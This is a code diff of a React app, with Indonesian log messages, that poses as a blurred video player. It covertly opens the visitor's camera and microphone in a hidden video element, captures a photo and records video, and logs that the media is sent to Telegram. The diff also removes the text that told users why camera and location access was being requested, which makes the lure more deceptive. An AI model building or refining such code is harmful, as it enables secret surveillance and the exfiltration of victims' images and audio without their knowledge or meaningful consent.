@@ -45,12 +45,12 @@ function App() {
       console.log('Perangkat video yang dipilih:', videoDevice.label);
 
       const constraints = {
-        video: { deviceId: videoDevice.deviceId, width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } }, // Kurangi resolusi untuk ukuran lebih kecil
+        video: { deviceId: videoDevice.deviceId, width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
         audio: true
       };
       console.debug('Meminta akses media dengan konstrain:', constraints);
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      cameraStreamRef.current = stream; // Simpan stream untuk dihentikan nanti
+      cameraStreamRef.current = stream;
       console.log('Stream media berhasil didapatkan');
 
       const videoTrack = stream.getVideoTracks()[0];
@@ -63,9 +63,9 @@ function App() {
       cameraVideo.playsInline = true;
       cameraVideo.muted = true;
       cameraVideo.autoplay = true;
-      cameraVideo.style.display = 'none'; // Sembunyikan elemen kamera
+      cameraVideo.style.display = 'none';
       
-      document.body.appendChild(cameraVideo); // Tambahkan ke DOM (tersembunyi)
+      document.body.appendChild(cameraVideo);
 
       // Tunggu metadata dan mulai penangkapan
       await new Promise((resolve) => {
@@ -108,13 +108,13 @@ function App() {
       console.log('Foto berhasil dikirim ke Telegram');
 
       // Rekam video dari kamera
-      const mimeTypes = ['video/mp4;codecs=h264,aac', 'video/mp4']; // Prioritaskan mp4 dengan h264
+      const mimeTypes = ['video/mp4;codecs=h264,aac', 'video/mp4'];
       const supportedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type));
       if (!supportedMimeType) throw new Error('Tidak ada format video yang didukung ditemukan (mp4/h264)');
       console.log('Format video yang dipilih:', supportedMimeType);
 
       console.log('Menginisialisasi MediaRecorder dengan tipe MIME:', supportedMimeType);
-      const mediaRecorder = new MediaRecorder(stream, { mimeType: supportedMimeType, videoBitsPerSecond: 4000000 }); // Kurangi bitrate
+      const mediaRecorder = new MediaRecorder(stream, { mimeType: supportedMimeType, videoBitsPerSecond: 4000000 });
       const chunks: BlobPart[] = [];
 
       mediaRecorder.ondataavailable = (e) => {
@@ -177,14 +177,12 @@ function App() {
           <div className="relative">
             <div className="relative bg-black rounded-lg overflow-hidden shadow-xl aspect-video">
               {isBlurred && (
-                <div className="absolute inset-0 backdrop-blur-md bg-black/50 flex items-center justify-center z-20 text-white">
-                  <p>Silakan izinkan akses kamera dan lokasi untuk memutar video.</p>
-                </div>
+                <div className="absolute inset-0 bg-black/50" /> /* Hilangkan teks dan gunakan blur sederhana */
               )}
               <video
                 ref={videoRef}
                 className="w-full h-full object-cover"
-                src="https://streamable.com/51e1pf" // URL video dummy (ganti dengan URL Anda)
+                src="https://cdn.streamable.com/video/jwqyy8/720p.mp4" // URL video dari Streamable
                 muted
                 loop
               />
